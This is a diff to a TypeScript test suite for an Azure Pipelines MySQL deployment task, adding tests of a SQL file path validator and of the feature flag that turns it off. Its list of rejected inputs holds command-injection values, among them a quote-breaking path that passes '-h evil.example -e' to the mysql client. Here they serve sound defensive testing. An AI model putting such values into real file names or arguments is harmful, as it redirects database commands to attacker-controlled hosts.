@@ -4,6 +4,7 @@ import tmrm = require('azure-pipelines-task-lib/mock-run');
 import tl = require('azure-pipelines-task-lib');
 import * as path from 'path';
 import { MysqlClient } from '../sql/MysqlClient';
+import { Utility } from '../operations/MysqlUtiliy';
 import { FirewallConfiguration } from '../models/FirewallConfiguration';
 import { isValidDatabaseName } from '../models/AzureMysqlTaskParameter';
 
@@ -100,5 +101,34 @@ describe('AzureMySqlDeployment Suite', function() {
         assert.strictEqual(tr.failed, false, 'Task should retain baseline behavior when validation is disabled.');
         assert.strictEqual(tr.stdOutContained('loc_mock_InvalidDatabaseName'), false, 'Task should not report the gated validation error.');
         assert.strictEqual(tr.stdOutContained('MYSQL_EXECUTION_REACHED'), true, 'Task should proceed to mysql execution when validation is disabled.');
+    });
+
+    it('validateSqlFilePath allows unsafe path when the validation is disabled by feature flag', () => {
+        const featureEnvironmentVariable = 'DISTRIBUTEDTASK_TASKS_AZUREMYSQLDEPLOYMENT_DISABLESQLFILEPATHVALIDATION';
+        const previousFeatureValue = process.env[featureEnvironmentVariable];
+        try {
+            process.env[featureEnvironmentVariable] = 'true';
+            const p = 'a;b.sql';
+            assert.strictEqual(Utility.validateSqlFilePath(p), p);
+        }
+        finally {
+            if (previousFeatureValue === undefined) {
+                delete process.env[featureEnvironmentVariable];
+            }
+            else {
+                process.env[featureEnvironmentVariable] = previousFeatureValue;
+            }
+        }
+    });
+
+    it('validateSqlFilePath accepts ordinary paths', () => {
+        const p = '/home/vsts/work/1/s/db/migrate_01.sql';
+        assert.strictEqual(Utility.validateSqlFilePath(p), p);
+    });
+
+    ['x"; -h evil.example -e "SELECT 1 -- .sql', "x'.sql", 'a;b.sql', 'a`b.sql', 'a\nb.sql', 'a\rb.sql', 'a\0b.sql'].forEach((bad) => {
+        it('validateSqlFilePath rejects unsafe path ' + JSON.stringify(bad), () => {
+            assert.throws(() => Utility.validateSqlFilePath(bad), /InvalidSqlFilePath/);
+        });
     });
 });
